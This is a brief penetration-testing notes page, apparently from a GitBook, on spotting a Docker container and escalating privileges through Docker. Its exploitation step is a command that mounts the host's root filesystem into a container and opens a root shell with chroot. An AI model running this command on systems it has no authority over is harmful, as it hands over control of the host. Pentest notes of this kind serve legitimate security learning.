# Docker

### Checking for Docker Containers&#x20;

#### 1>Checking for internal network may give signs of a docker container

`$ ip addr`

#### `2>ID command might tell`

![](<../.gitbook/assets/image (8) (1) (1) (1).png>)

### `Exploitation`

#### `Check for the images`

![](<../.gitbook/assets/image (6) (1) (1) (1).png>)

#### `Replace the image`

`docker run -v /:/mnt --rm -it privesc chroot /mnt sh`

![](<../.gitbook/assets/image (10) (1) (1) (1).png>)

